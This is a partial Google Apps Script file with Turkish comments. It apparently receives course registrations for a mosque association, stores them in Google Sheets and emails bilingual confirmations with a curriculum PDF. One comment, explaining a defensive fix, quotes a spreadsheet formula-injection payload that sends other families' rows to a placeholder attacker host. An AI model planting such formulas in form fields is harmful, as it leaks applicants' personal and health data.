...
function doGet(e) {
  ...
  return json({ ok: true, servis: "ulucamii-alici", surum: 14, zaman: new Date().toISOString() });
}
...
function panelListeIsle(e) {
  try {
    ...
    return json({
      ok: true, surum: 14, zaman: new Date().toISOString(),
...
function panelBelgeIsle(e) {
  try {
    ...
    return json({
      ok: true, surum: 14, ref: ref, kayit: kayit,
...
/**
 * Sheets'e yazilacak bir hucreyi METNE sabitler.
 *
 * NEDEN: Google Sheets "=", "+", "-" veya "@" ile baslayan bir metni FORMUL sayar. Basvurandan
 * gelen bir alan (veli adi, adres, saglik notu...) boylece defterde CALISIR: adres alanina
 * yazilan =IMPORTXML("http://saldirgan/?"&A2;"//a") gibi bir girdi, defterdeki diger ailelerin
 * verisini disari sizdirabilirdi. Zararsiz bir tek tirnak oneki hucreyi metin olarak sabitler
 * ve Sheets arayuzunde GORUNMEZ. Panelin CSV ciktisinda ayni koruma zaten vardi; defterin
 * kendisinde yoktu (26 Agustos 2026 guvenlik incelemesi).
 *
 * Tarih nesneleri oldugu gibi gecer: ilk sutundaki zaman damgasi bozulmamali.
 */
...
/** Defterle konusan TEK yer: her satir yazilmadan once hucre hucre guvenlestirilir. */
...
function kayitPostIsle(v) {
  try {
    ...
    MailApp.sendEmail({
      ...
      attachments: [blob],
      name: EPOSTA.ad,
      /* "Yanitla" dogrudan veliye gitsin; adres gecersizse dernek adresine. */
      replyTo: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(veli.eposta || "").trim())
        ? String(veli.eposta).trim() : EPOSTA.yanit
    });
...
/* --- E-POSTA KIMLIGI (v12, 29 Agustos 2026, Mehmet Bey bildirdi) -------
   MailApp her zaman betigi calistiran hesaptan (ulucamii2026@gmail.com)
   gonderir; "from" secenegi yoktur. Gmail'in "Send mail as" yolu ise Google
   tarafindan Ocak 2027'de ucuncu taraf adresler icin kapatiliyor, kalici cozum
   degil. Bu surumde yapilabilen: Reply-To dernek adresine, gonderen adi
   dernek adina, govde dil etiketli HTML (Gmail'in "Ingilizce gorunuyor,
   cevrilsin mi?" seridine karsi). Alan adindan cikan gonderim icin HTTP
   e-posta API'li bir saglayici gerekir (UrlFetchApp) — ayri karar. */
var EPOSTA = {
  yanit: "info@ulucamii.be",
  ad: "Ulu Camii Marche-en-Famenne"
};

/* DERS KİTAPLARI (v14, 29 Ağustos 2026, Rıdvan istedi): veliye giden onay
   e-postasında hangi kitapların okutulduğu, nereden temin edileceği ve derse
   ne getirileceği yazılır. Kitapların PDF'i GÖNDERİLMEZ (telif); yalnız
   yayıncının/Diyanet'in kendi bağlantıları verilir. Bağlantılar tek yerde
   toplandı; değişirse yalnız burası güncellenir. */
var KITAPLAR = {
...
/* Gövde düz metin satır dizisi olarak kurulur; mailHtml() boş satırı paragraf,
   tek satır sonunu <br> yapar. Madde satırları "- " ile başlar. */
...
/* MÜFREDAT EKİ (v13, 29 Ağustos 2026, Rıdvan istedi): veliye giden onay
   e-postasına kursun 2026-2027 müfredat ve yıllık ders planı PDF'i eklenir.
   Tek kaynak sitedir; dosya her gönderimde siteden çekilir (≈460 KB), böylece
   müfredat güncellenince betiğe dokunmak gerekmez. Çekilemezse e-posta eksiz
   gider — kayıt onayı müfredata bağlı olamaz. */
var MUFREDAT = {
...
function mufredatEki() {
  try {
    ...
    if (blob.getBytes().length < 10000) return null;          // boş/hatalı içerik
    return blob.setName(MUFREDAT.dosyaAdi).setContentType("application/pdf");
  } catch (hata) {
...
function htmlKacir(m) {
  return String(m).replace(/[&<>"']/g, function (c) {
    return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
  });
}

/* Duz metni ayirac cizgilerinden ("-----") bloklara boler: 1. blok Turkce,
   2. blok Fransizca, sonrasi (kunye) Turkce. Her blok kendi lang etiketini alir;
   bos satir paragraf, tek satir sonu <br>. */
function mailHtml(govde) {
  ...
  var parcalar = bloklar.map(function (blok, i) {
    var paragraflar = blok.trim().split(/\n\s*\n/).map(function (p) {
      return "<p style=\"margin:0 0 12px\">" + htmlKacir(p.trim()).replace(/\n/g, "<br>") + "</p>";
    }).join("");
...
function kopyaGonder(blob, ref, adSoyad, guncelleme, adresler) {
  ...
  const govde = [
    ...
    .concat([
      "",
    "2026-2027 müfredatı ve yıllık ders planı (hangi gün hangi ders, kaynak kitaplar, kazanımlar)",
    "bu e-postanın ekindedir; web sürümü: " + MUFREDAT.sayfa,
    "",
    "Bilgilerinizde bir düzeltme gerekirse: kaydı yaptığınız cihazda kayıt sayfasını açın,",
    "\"Bu cihazdan yaptığınız kayıtlar\" bölümünde \"Bilgileri düzelt\"e dokunun.",
    "Başka bir cihazdan düzeltecekseniz \"Kaydımı başka bir cihazdan düzeltmek istiyorum\"",
    "bölümüne " + ref + " numarasını yazın. Yeni kayıt açılmaz, aynı kayıt güncellenir.",
    "",
    "----------------------------------------------------------",
    "",
    "Bonjour,",
    ...
    .concat([
      "",
    "Le programme et le plan annuel des cours 2026-2027 (matières par jour, manuels, acquis)",
    "sont joints à cet e-mail (document en turc) ; version web : " + MUFREDAT.sayfaFr,
    "",
    "Pour corriger une information : sur l'appareil utilisé pour l'inscription, ouvrez la page",
    "d'inscription et touchez « Corriger les informations » dans « Inscriptions faites depuis cet appareil ».",
    "Depuis un autre appareil, indiquez le numéro " + ref + " dans la rubrique",
    "« Je veux corriger mon inscription depuis un autre appareil ». La même inscription est mise à jour.",
    "",
    "----------------------------------------------------------",
    "",
  ...
  gecerli.forEach(function (adres) {
    try {
      MailApp.sendEmail({
        ...
        subject: konu,
        body: govde,
        htmlBody: mailHtml(govde),
        attachments: ekler,
        name: EPOSTA.ad,
        replyTo: EPOSTA.yanit
      });
    } catch (hata) {
...
function ihtidaKopyaGonder(blob, ref, adSoyad, eposta) {
  ...
  try {
    MailApp.sendEmail({ to: adres, subject: konu, body: govde, htmlBody: mailHtml(govde),
